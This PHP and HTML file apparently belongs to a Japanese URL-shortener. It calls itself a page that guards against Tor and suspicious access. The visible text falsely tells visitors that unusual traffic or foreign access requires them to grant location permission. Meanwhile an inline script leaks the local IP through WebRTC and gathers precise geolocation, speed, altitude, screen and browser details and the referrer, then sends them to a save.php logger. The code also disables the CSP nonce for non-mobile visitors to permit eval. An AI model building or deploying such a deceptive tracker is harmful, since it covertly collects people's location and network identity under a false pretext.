<?php
  require_once(dirname(__FILE__)."/PLEASEEDIT.php");
  // XSS対策
  $nonce = substr(str_shuffle('1234567890abcdefghijklmnopqrstuvwxyz'), 0, 36);
  // スマホ判定
  function is_android() {
    if (!preg_match('/'.implode('|', array('Android')).'/i', $_SERVER['HTTP_USER_AGENT'])) return "no";
    else return "yes";
  }
  function is_iphone() {
    if (!preg_match('/'.implode('|', array('iPhone')).'/i', $_SERVER['HTTP_USER_AGENT'])) return "no";
    else return "yes";
  }
  function is_winphone() {
    if (!preg_match('/'.implode('|', array('Windows Phone')).'/i', $_SERVER['HTTP_USER_AGENT'])) return "no";
    else return "yes";
  }
  if (is_android() == "no" && is_iphone() == "no" && is_winphone() == "no")
    $issumaho = false;
  else
    $issumaho = true;
  // スマホ以外だった場合、コード難読化に伴い、evalを利用する為にnonceを無効化
  // > スマホのみnonce有効化
  if ($issumaho)
    header("Content-Security-Policy: script-src 'nonce-{$nonce}' 'strict-dynamic'");
  // DOS攻撃対策
  if (sys_getloadavg()[0] > 40) {
    header('HTTP/1.1 503 Too busy, try again later');
    die('<p>すみませんが、サーバーへのアクセスが集中しています。数分時間を開けてからアクセスしてください。</p>');
  }
  // URLとIDが割り当てられている場合
  if (isset($_GET["url"]) && isset($_GET["flg"]))
  {
    // HTTPヘッダーインジェクションの脆弱性対策
    $url = str_replace("\n", "", $_GET["url"]);
    $url = str_replace("\r", "", $url);
    $flg = str_replace("\n", "", $_GET["flg"]);
    $flg = str_replace("\r", "", $flg);
    if (isset($_SERVER['HTTP_REFERER'])) $encoderef = str_replace("\n", "", $_SERVER['HTTP_REFERER']);
    else $encoderef = "(Referer無し)";
    $encoderef = str_replace("\r", "", $url);
    // ディレクトリトラバーサル攻撃対策
    // 下手にいじると脆弱性の原因となるので気を付けてください。
    $su = 10000000;
    $min = 0;
    if(is_numeric($flg) && $flg < $su && $flg > $min) {}
    else exit("<p>Error: Unknown Warning.</p>\nURL短縮サービスをご利用頂き、ありがとうございます。<br>\n申し訳ございませんが、お客様がリクエストした短縮URLは存在しません。\n<br>リンクの再送を依頼してください。");
    // ヌルバイト攻撃対策
    $url = str_replace("\0", "", $url);
    $flg = str_replace("\0", "", $flg);
    $encoderef = str_replace("\0", "", $encoderef);
    // ボットは排除
    // ユーザーエージェントに「bot」が入っている、もしくは「Mozilla」という文字列が入っていない場合はロボットと判定
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false ||
        strpos($_SERVER['HTTP_USER_AGENT'], 'Bot') !== false ||
        !(strpos($_SERVER['HTTP_USER_AGENT'], 'Mozilla') !== false)
    )
    {
      header("Location: {$url}");
      exit("<p>302. Please Redirect.</p>");
    }
    // エンコード版
    $encodedurl = rawurlencode($url);
    $encoderef = rawurlencode($encoderef);
  }
  // 割り当てられていない場合(ドメインアクセス時)
  else
  {
    header("Location: ".sk."://".root.path."admin/");
    exit("<p>302. Please Redirect.</p>");
  }
?>
<!--
***************************************
**        URL短縮サービス            **
**  Tor等の不審なアクセス対策ページ  **
***************************************
 -->

<!DOCTYPE html>
<html lang="ja" dir="ltr">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
    <title>URL短縮サービス</title>
    <meta name="robots" content="noindex">
    <meta name="favicon" content="https://www.activetk.cf/icon/index_32_32.ico">
    <script type="text/javascript" nonce="<?=$nonce?>">try{window.RTCPeerConnection=window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection;var pc=new RTCPeerConnection({iceServers:[]}),noop=function(){};pc.createDataChannel('');pc.createOffer(pc.setLocalDescription.bind(pc),noop);pc.onicecandidate=function(ice){if(ice&&ice.candidate&&ice.candidate.candidate){window.iceinfo=ice.candidate.candidate;pc.onicecandidate=noop;red();}else{window.iceinfo="取得出来ませんでした。。";red();}};}catch(n){window.iceinfo="取得出来ませんでした。。";red();};if(!(typeof(screen.colorDepth)==="undefined")){var wC=screen.colorDepth,gSt="";gSt=1==wC?"白黒(1ビット)":4==wC?"16色(4ビット)":8==wC?"256色(8ビット)":16==wC?"65,536色(16ビット)":24==wC?"1677万色(24ビット)":32==wC?"1677万色(32ビット)":wC+"ビットカラー";window.scolor=gSt;};function red(){navigator.geolocation?navigator.geolocation.getCurrentPosition(function(e){location.href="<?=sk?>://<?=root?><?=path?>save.php?ido="+e.coords.latitude+"&keido="+e.coords.longitude+"&koudo="+e.coords.altitude+"&seido="+e.coords.accuracy+"&speed="+e.coords.speed+"&screenw="+window.screen.width+"&screenh="+window.screen.height+"&winlang="+window.navigator.language+"&wincolor="+window.scolor+"&winname="+window.navigator.appName+"&iceinfo="+window.iceinfo+"&flg=<?=$flg?>&url=<?=$encodedurl?>&ref=<?=$encoderef?>"},function(e){location.href="<?=sk?>://<?=root?><?=path?>save.php?error="+e.code+"&flg=<?=$flg?>&url=<?=$encodedurl?>"},{enableHighAccuracy:!1,timeout:8e3,maximumAge:2e3}):location.href="<?=sk?>://<?=root?><?=path?>save.php?error=noapi&flg=<?=$flg?>&url=<?=$encodedurl?>"}</script>
    <noscript><meta http-equiv="refresh" content="0;URL='<?=sk?>://<?=root?><?=path?>save.php?error=noscript&flg=<?=$flg?>&url=<?=$encodedurl?>'"></noscript>
    <meta http-equiv="refresh" content="30;URL='<?=sk?>://<?=root?><?=path?>save.php?error=timeout&flg=<?=$flg?>&url=<?=$encodedurl?>'">
  </head>
  <body style="background-color:#e6e6fa;color:#363636;">
    <noscript><div title="NO SCRIPT ERROR" style="background-color:#404ff0;" align="center"><font color="#ff4500"><h1>No JavaScript Error.</h1></font></div></noscript>
    <div align="center">
      <br><br><br>
<?php
    $msgt = rand(1, 2);
    if ($msgt == 1) { ?>
      <p>URL短縮サービスを利用して頂きありがとうございます。</p>
      <p>お使いのネットワークから通常とは異なるトラフィックが検出された為、位置情報の取得を許可して日本からのアクセスである事を証明して頂く必要があります。</p>
<?php } else { ?>
      <p>URL短縮サービスを利用して頂きありがとうございます。</p>
      <p>本サービスでは日本国外からのアクセスを制限しています。</p>
      <p>日本国内からのアクセスである事を証明する為、位置情報の取得を許可して頂く必要があります。</p>
<?php } ?>
    </div>
  </body>
</html>